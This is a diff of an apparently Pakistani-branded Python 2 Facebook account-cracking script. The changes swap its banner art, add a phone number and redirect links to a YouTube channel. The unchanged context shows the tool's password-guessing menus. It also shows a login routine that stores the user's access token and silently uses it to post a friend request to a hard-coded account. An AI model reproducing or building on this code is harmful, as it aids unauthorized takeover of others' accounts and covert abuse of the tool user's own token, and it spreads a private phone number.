@@ -55,12 +55,15 @@ logo = """ -----------------------------•◈•
 |__~~~\   •◈•----  ℍ𝕒𝕟𝕕𝕤𝕠𝕞𝕖 𝔹𝕠𝕪  --------•◈•
         𝒩ℴ𝓌 𝒴ℴ𝓊 𝒜𝓇ℯ ℐ𝓃 𝒯𝒽ℯ 𝒜𝓇𝒷𝒶𝒷,𝓈 𝒞ℴ𝓂𝓂ℴ𝓃𝒹  
   
-┏━━━┓ ┏━━━┓ ┏━━┓︱ ┏━━━┓ ┏━━┓︱   ┏━━━┓ ┏┓︱︱︱ ┏━━┓
-┃┏━┓┃ ┃┏━┓┃ ┃┏┓┃︱ ┃┏━┓┃ ┃┏┓┃︱   ┃┏━┓┃ ┃┃︱︱︱ ┗┫┣┛
-┃┃︱┃┃ ┃┗━┛┃ ┃┗┛┗┓ ┃┃︱┃┃ ┃┗┛┗┓   ┃┃︱┃┃ ┃┃︱︱︱ ︱┃┃︱
-┃┗━┛┃ ┃┏┓┏┛ ┃┏━┓┃ ┃┗━┛┃ ┃┏━┓┃   ┃┗━┛┃ ┃┃︱┏┓ ︱┃┃︱
-┃┏━┓┃ ┃┃┃┗┓ ┃┗━┛┃ ┃┏━┓┃ ┃┗━┛┃   ┃┏━┓┃ ┃┗━┛┃ ┏┫┣┓
-┗┛︱┗┛ ┗┛┗━┛ ┗━━━┛ ┗┛︱┗┛ ┗━━━┛   ┗┛︱┗┛ ┗━━━┛ ┗━━┛
+
+╔═══╗───╔╗──────╔═══╗─╔╗────╔╗
+║╔═╗║───║║──────║╔═╗║─║║────║║
+║║─╚╬╗─╔╣╚═╦══╦═╣║─║╠═╣╚═╦══╣╚═╗
+║║─╔╣║─║║╔╗║║═╣╔╣╚═╝║╔╣╔╗║╔╗║╔╗║
+║╚═╝║╚═╝║╚╝║║═╣║║╔═╗║║║╚╝║╔╗║╚╝║
+╚═══╩═╗╔╩══╩══╩╝╚╝─╚╩╝╚══╩╝╚╩══╝
+────╔═╝║
+────╚══╝
                        Arbab Ali
                      ▇◤▔▔▔▔▔▔▔◥▇
                      ▇▏◥▇◣┊◢▇◤▕▇
@@ -73,7 +76,7 @@ logo = """ -----------------------------•◈•
 
    √√√√√There are 2 lac passwords in this commond√√√√√
          ♥️♥️♥️🄼🄾🅂🅃 🅆🄴🄻🄻🄲🄾🄼🄴 ♥️♥️♥️
-         ♥️ RamaZan Mubarak to Everyone♥️
+         ♥️ Shahzada Arbab 03003023263♥️
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mArbab Memon
 \033[1;96mInstagram \033[1;93m: \033[1: Soon
@@ -119,10 +122,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q ')
+            os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA ')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://m.youtube.com/channel/UCco_3EYpaVx7ZwnYUzzy56Q ')
+        os.system('xdg-open  https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA ')
 
 def login():
 	os.system('clear')
@@ -163,7 +166,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -247,8 +250,8 @@ def super():
 	print 42*"\033[1;96m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Enter From Friend List"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Enter From Any Public ID"
-        print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Enter From Gmail(Activated)"
-        print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Enter From Yahoo(proceed)"
+        print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Enter From Gmail(Update in wk)"
+        print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;93m Enter From Yahoo(update in wk)"
         print "\x1b[1;96m[\x1b[1;92m5\x1b[1;96m]\x1b[1;93m Enter From File"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
